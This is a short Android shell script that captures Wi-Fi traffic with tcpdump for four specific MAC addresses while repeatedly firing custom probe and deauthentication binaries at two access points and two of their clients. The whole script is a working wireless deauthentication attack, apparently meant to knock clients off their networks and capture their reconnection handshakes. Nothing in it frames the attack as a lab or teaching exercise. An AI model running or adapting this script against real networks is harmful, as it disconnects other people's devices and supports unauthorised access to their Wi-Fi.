#!/system/bin/sh
DUR=40
rm -f /data/local/tmp/capE.pcap
timeout $DUR tcpdump -i wlan0 -s 0 -w /data/local/tmp/capE.pcap "ether host bc:3e:07:01:dc:92 or ether host bc:3e:07:01:dc:98 or ether host e6:89:4c:90:cd:ed or ether host bc:61:93:23:bc:3f" >/dev/null 2>&1 &
TPID=$!
sleep 2
END=$(( $(date +%s) + $DUR ))
while [ $(date +%s) -lt $END ]; do
  /data/local/tmp/probe wlan0 bc3e0701dc92 bc3e0701dc92 32H10F 10 100 2>/dev/null
  /data/local/tmp/probe wlan0 bc3e0701dc92 ffffffffffff 32H10F 10 100 2>/dev/null
  /data/local/tmp/probe wlan0 bc3e0701dc98 bc3e0701dc98 32H10F 10 100 2>/dev/null
  /data/local/tmp/probe wlan0 bc3e0701dc98 ffffffffffff 32H10F 10 100 2>/dev/null
  /data/local/tmp/deauth wlan0 bc3e0701dc92 e6894c90cded 15 100 2>/dev/null
  /data/local/tmp/deauth wlan0 bc3e0701dc98 e6894c90cded 15 100 2>/dev/null
  /data/local/tmp/deauth wlan0 bc3e0701dc92 bc619323bc3f 10 150 2>/dev/null
done
wait $TPID 2>/dev/null
wc -c /data/local/tmp/capE.pcap
echo CAPE_DONE
